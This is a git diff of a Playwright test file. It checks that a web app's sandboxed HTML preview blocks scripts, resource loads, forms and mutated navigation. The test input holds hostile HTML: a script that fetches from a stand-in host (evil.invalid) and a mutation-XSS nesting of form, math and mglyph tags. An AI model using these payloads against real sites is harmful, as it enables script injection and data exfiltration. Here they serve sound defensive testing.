@@ -1,8 +1,6 @@
 import { expect, test } from "@playwright/test";
 import path from "node:path";
 
-const moduleUrl = `/@fs${path.resolve(import.meta.dirname, "../apps/web/src/components/html/html-preview-document.ts")}`;
-
 test("HTML boundary refuses resources, scripts, forms and mutated navigation", async ({ page }) => {
   await page.goto("/html-preview");
   await expect(page.locator("iframe")).toBeAttached();
@@ -16,8 +14,9 @@ test("HTML boundary refuses resources, scripts, forms and mutated navigation", a
   });
   const popups: unknown[] = [];
   page.on("popup", (popup) => popups.push(popup));
-  await page.evaluate(async (url) => {
-    const { buildHtmlPreviewDocument } = await import(url);
+  await page.evaluate(async () => {
+    const { buildHtmlPreviewDocument } =
+      await window.__fixtureModules!["components/html/html-preview-document"]();
     const frame = document.querySelector("iframe")!;
     frame.srcdoc = buildHtmlPreviewDocument(`
       <script>document.body.textContent='EXECUTED';fetch('https://evil.invalid/script')</script>
@@ -34,7 +33,7 @@ test("HTML boundary refuses resources, scripts, forms and mutated navigation", a
       <form><math><mtext></form><form><mglyph><style></math><a id="mutated" href="https://evil.invalid/mutated">Mutation</a>
       <a id="jump" href="#end">Jump</a><div style="height:1600px"></div><p id="end">End</p>
     `).srcDoc;
-  }, moduleUrl);
+  });
   const frame = page.frameLocator("iframe");
   await expect(frame.locator("#jump")).toBeVisible();
   await page.waitForTimeout(100);
@@ -65,8 +64,9 @@ test("an inlined sibling stylesheet applies under the CSP and sandbox, and loads
       await route.abort();
     } else await route.continue();
   });
-  await page.evaluate(async (url) => {
-    const { buildHtmlPreviewDocument } = await import(url);
+  await page.evaluate(async () => {
+    const { buildHtmlPreviewDocument } =
+      await window.__fixtureModules!["components/html/html-preview-document"]();
     const frame = document.querySelector("iframe")!;
     frame.srcdoc = buildHtmlPreviewDocument(
       `<!doctype html>
@@ -87,7 +87,7 @@ test("an inlined sibling stylesheet applies under the CSP and sandbox, and loads
         ]),
       },
     ).srcDoc;
-  }, moduleUrl);
+  });
   const frame = page.frameLocator("iframe");
   await expect(frame.locator("#styled")).toBeVisible();
   await expect(frame.locator("#styled")).toHaveCSS("color", "rgb(1, 2, 3)");
